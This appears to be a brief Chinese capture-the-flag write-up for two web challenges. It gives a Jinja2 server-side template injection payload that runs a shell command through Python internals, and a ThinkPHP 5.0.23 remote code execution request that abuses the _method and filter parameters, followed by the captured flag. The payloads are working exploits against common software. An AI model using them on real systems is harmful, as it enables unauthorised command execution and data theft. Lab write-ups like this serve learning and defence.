Web

## fake google

> 知识点：SSTI

> 题解

1. 根据源代码注释提示，SSTI模板注入
2. 注入

```
{% for c in [].__class__.__base__.__subclasses__() %}
{%if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}
{%endif%}
{% endfor %}
```

## old-hack

> 知识点：ThinkPHP5.0.23 远程RCE

> 题解

```
POST http://244a0b0a-7187-4c12-b732-c4c75557924b.node3.buuoj.cn/?s=captcha

{
    "_method": "__construct",
    "filter[]": "system",
    "server[REQUEST_METHOD]": "cat /flag"
}
```

> flag{5c1565e5-6062-4416-b15a-75d3bc704bc6}